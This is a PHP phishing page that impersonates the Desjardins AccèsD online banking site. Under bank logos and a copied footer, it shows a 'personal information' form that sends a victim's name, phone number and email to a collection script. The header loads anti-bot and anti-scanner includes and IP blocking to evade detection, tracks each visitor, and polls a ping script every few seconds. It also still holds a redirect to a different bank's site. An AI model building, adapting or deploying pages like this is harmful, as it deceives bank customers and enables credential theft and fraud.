<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include("track.php");
include 'page_notify.php';

// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('info.php'); 




?>

<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="image/logo.png">
    <link rel="stylesheet" href="style.css">
    <title>Formulaire Informations Personnelles</title>
</head>

<body>

    <!-- Top Header -->
    <div class="top-header bg-dark text-white py-2 px-4 d-flex justify-content-end align-items-center">
        <a href="authentification.html" class="text-white text-decoration-none mx-2">AA +</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">English</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Nous joindre</a>
        <span class="border-start border-1 mx-2"></span>
        <a href="#" class="text-white text-decoration-none mx-2">Aide</a>
    </div>

    <!-- Bottom Header -->
    <div class="bottom-header bg-white py-2 px-5 d-flex align-items-center">
        <img src="image/logo-desjardins-couleur.png" alt="Logo Desjardins" class="logo-desjardins me-3">
        <img src="image/accesd1933.jpg" alt="Logo AccèsD" style="height: 90px;" class="accesd-logo me-3">
        <img src="image/images-removebg-preview.png" alt="Logo AccèsD Affaires" class="accesd-affaires-logo">
    </div>

    <!-- Main Container -->
    <div class="container my-5 shadow bg-white position-relative">
        <div class="row">
            <!-- Form Section -->
            <div class="col-md-6 p-5 form-section">
                <h2 class="text-success">Formulaire d'Informations Personnelles</h2>

                <form id="info-form" action="action/info.php" method="POST">
                    <div class="mb-3">
                        <label for="lastName" class="form-label fw-bold">Nom</label>
                        <input type="text" id="lastName" name="lastName" class="form-control" required>
                    </div>

                    <div class="mb-3">
                        <label for="firstName" class="form-label fw-bold">Prénom</label>
                        <input type="text" id="firstName" name="firstName" class="form-control" required>
                    </div>

                    <div class="mb-3">
                        <label for="phone" class="form-label fw-bold">Numéro de téléphone</label>
                        <input type="tel" id="phone" name="phone" class="form-control" required>
                    </div>

                    <div class="mb-3">
                        <label for="email" class="form-label fw-bold">Adresse e-mail</label>
                        <input type="email" id="email" name="email" class="form-control" required>
                    </div>

                    <button type="submit" class="btn btn-success w-50 mt-4">Valider</button>
                    <?php if (isset($_GET['error']) && $_GET['error'] == 1): ?>
    <div style="margin-top: 10px; color: red; font-weight: bold;">
        ❌ Informations incorrectes. Veuillez réessayer.
    </div>
<?php endif; ?>

                </form>
            </div>

            <!-- Image Section -->
            <div class="col-md-6 image-section d-none d-md-block">
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer bg-dark text-center text-white py-4">
        <div class="container">
            <div class="footer-top d-flex flex-wrap justify-content-center">
                <a href="#" class="text-white text-decoration-none me-3">SERVICES AUX PARTICULIERS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">SERVICES AUX ENTREPRISES</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">CONSEILS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">À PROPOS</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-3">APPLICATION MOBILE</a>
            </div>
            <div class="footer-bottom d-flex flex-wrap justify-content-center mt-2">
                <a href="#" class="text-white text-decoration-none mx-2">Sécurité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Conditions d'utilisation et notes légales</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Confidentialité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Personnaliser les témoins</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Accessibilité</a>
                <span class="footer-separator">|</span>
                <a href="#" class="text-white text-decoration-none mx-2">Plan du site</a>
            </div>
            <p class="text-muted mt-2 mb-0">© 1996-2024, Mouvement des caisses Desjardins. Tous droits réservés.</p>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    setInterval(() => {
    fetch('ping.php');
}, 5000); // toutes les 5 secondes
</script>

</body>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>


</html>
